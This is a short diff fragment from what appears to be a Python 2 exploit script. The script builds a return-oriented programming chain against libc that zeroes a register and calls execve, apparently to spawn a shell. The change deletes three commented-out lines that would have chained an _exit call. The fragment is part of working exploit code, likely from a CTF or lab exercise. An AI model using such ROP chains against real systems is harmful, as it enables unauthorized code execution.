@@ -115,9 +115,6 @@ if __name__ == "__main__":
     ROP += p64(LIBC_BASE + POP_RDX)
     ROP += p64(0)
     ROP += p64(LIBC_BASE + libc.symbols['execve'])
-    #ROP += p64(LIBC_BASE + POP_RDI)
-    #ROP += p64(0)
-    #ROP += p64(LIBC_BASE + libc.symbols['_exit'])
 
     print "length of ROP: %d" % len(ROP)
 
